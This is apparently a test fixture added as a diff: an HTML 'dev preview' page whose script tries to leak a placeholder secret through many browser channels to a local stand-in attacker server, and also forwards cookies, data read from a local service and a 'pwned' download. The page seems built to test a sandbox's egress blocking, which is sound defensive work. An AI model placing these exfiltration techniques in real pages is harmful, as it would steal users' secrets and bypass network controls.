@@ -1,0 +1,59 @@
+<!doctype html><meta charset=utf-8><title>dev preview</title>
+<h1>Your app</h1>
+<a id=link href="http://127.0.0.1:4000/hit?via=link-click&d={{SECRET}}" ping="http://127.0.0.1:4000/hit?via=a-ping&d={{SECRET}}">docs</a>
+<a id=blank target=_blank href="http://127.0.0.1:4000/hit?via=link-blank&d={{SECRET}}">open in new tab</a>
+<a id=dl download="setup.command" href="data:text/plain,echo%20pwned">download</a>
+<form id=f method=POST action="http://127.0.0.1:4000/hit?via=form&d={{SECRET}}" target=_top><input name=d value="{{SECRET}}"></form>
+<script>
+const S = "{{SECRET}}";
+const A = "http://127.0.0.1:4000/hit?d=" + S + "&via=";
+const T = (name, f) => { try { f(); } catch (e) {} };
+const Q = new URLSearchParams(location.search), LEAVE = Q.get("leave") || "";
+// What an honest app does on its own origin, reported to the computer's own server.
+const OK = w => fetch("/ok?what=" + w).catch(() => {});
+if (!LEAVE) {
+  fetch("/ok?what=fetch-own-origin").catch(() => {});
+  T("storage", () => { localStorage.setItem("k", "v"); if (localStorage.getItem("k") === "v") OK("localStorage"); });
+  T("own-cookie", () => { document.cookie = "app=1; path=/"; if (document.cookie.includes("app=1")) OK("own-cookie"); });
+  T("own-image", () => { const i = new Image(); i.onload = () => OK("own-image"); i.onerror = () => OK("own-image-404-but-allowed"); i.src = "/pixel.png"; });
+  T("ws-own-origin", () => { const w = new WebSocket("ws://" + location.host + "/ws"); w.onerror = () => {}; });
+}
+if (Q.get("internal")) OK("internal-navigation");
+if (!LEAVE) {
+T("fetch", () => fetch(A + "fetch", {mode: "no-cors", method: "POST", body: S}).catch(() => {}));
+T("beacon", () => navigator.sendBeacon(A + "beacon", S));
+T("img", () => { new Image().src = A + "img"; });
+T("css", () => { const s = document.createElement("style"); s.textContent = `body{background:url("${A}css")}`; document.head.appendChild(s); });
+T("ws", () => new WebSocket("ws://127.0.0.1:4000/hit?via=ws&d=" + S));
+T("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = A + "prefetch"; document.head.appendChild(l); });
+T("speculation", () => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({prefetch: [{source: "list", urls: [A + "speculation"]}]}); document.head.appendChild(s); });
+T("iframe", () => { const i = document.createElement("iframe"); i.src = A + "iframe"; document.body.appendChild(i); });
+T("worker", () => new Worker(URL.createObjectURL(new Blob([`fetch("${A}worker",{mode:"no-cors"})`]))));
+T("sw", () => navigator.serviceWorker && navigator.serviceWorker.register("/sw.js"));
+T("eventsource", () => new EventSource(A + "eventsource"));
+// WebRTC: the secret rides in the ICE username, sent to the attacker's STUN server over UDP.
+T("webrtc", async () => {
+  const pc = new RTCPeerConnection({iceServers: [{urls: "stun:127.0.0.1:4001"}, {urls: "turn:127.0.0.1:4001?transport=udp", username: S, credential: "x"}]});
+  pc.createDataChannel("x");
+  const o = await pc.createOffer();
+  const ufrag = S.replace(/-/g, "");
+  await pc.setLocalDescription({type: "offer", sdp: o.sdp.replace(/a=ice-ufrag:.*\r\n/g, `a=ice-ufrag:${ufrag}\r\n`)});
+});
+// The Mac's own things: a service on the Mac, and the cookies of the user's other localhost apps.
+fetch("http://127.0.0.1:5000/api/tags").then(r => r.text()).then(t => { new Image().src = A + "mac-service&got=" + encodeURIComponent(t); fetch(A + "mac-service-fetch&got=" + encodeURIComponent(t), {mode: "no-cors"}).catch(()=>{}); }).catch(() => {});
+T("cookie", () => { if (document.cookie) { new Image().src = A + "cookie&c=" + encodeURIComponent(document.cookie); navigator.sendBeacon(A + "cookie-beacon&c=" + encodeURIComponent(document.cookie)); } });
+document.title = "cookies seen: " + (document.cookie || "none");
+}
+// Leaving the page, one way per load (?leave=<way>): open a window, navigate the top page, submit a
+// form to the top page, navigate this document, a meta refresh, a download.
+const LEAVES = {
+  "window.open": () => window.open(A + "window-open"),
+  "top-navigation": () => { top.location.href = A + "top-navigation"; },
+  "form-top": () => document.getElementById("f").submit(),
+  "self-navigation": () => { location.href = A + "self-navigation"; },
+  "meta-refresh": () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + A + "meta-refresh"; document.head.appendChild(m); },
+  "download": () => document.getElementById("dl").click(),
+  "internal-navigation": () => { location.href = "/?leave=none&internal=1"; },
+};
+if (LEAVES[LEAVE]) setTimeout(() => T(LEAVE, LEAVES[LEAVE]), 200);
+</script>
